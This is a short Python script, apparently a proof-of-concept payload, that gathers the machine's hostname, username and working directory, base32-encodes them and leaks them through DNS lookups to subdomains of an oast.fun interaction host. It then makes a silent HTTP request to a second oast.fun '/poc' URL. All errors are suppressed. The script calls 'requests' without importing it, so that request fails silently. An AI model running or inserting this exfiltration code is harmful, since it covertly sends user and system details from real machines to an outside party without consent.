import os
import socket
import base64
import random

# Generate random session ID
session_id = ''.join(random.choices('abcdefghjkmnpqrstuvwxyz23456789', k=6))

# Collect target information
hostname = socket.gethostname() or "unknown"
username = os.getlogin() if hasattr(os, 'getlogin') else os.environ.get('USER', 'unknown')
current_dir = os.getcwd()

# Format and encode data
data = f"{hostname}|{username}|{current_dir}"
encoded = base64.b32encode(data.encode()).decode().replace('=', '').lower()

# Split into DNS-friendly chunks (max 63 chars/label)
chunks = [encoded[i:i+50] for i in range(0, len(encoded), 50)]

# Send DNS queries
for i, chunk in enumerate(chunks):
    domain = f"{session_id}-{i}.qlcbitwoqeabfuogzvdubtnagoj9k8ure.oast.fun"
    try:
        socket.getaddrinfo(domain, 0)  # Trigger DNS lookup
        requests.get("https://someeebbb.vovdismvlwftwnvghtcidyqr0gzqar1qn.oast.fun/poc")
    except:
        pass  # Fail silently
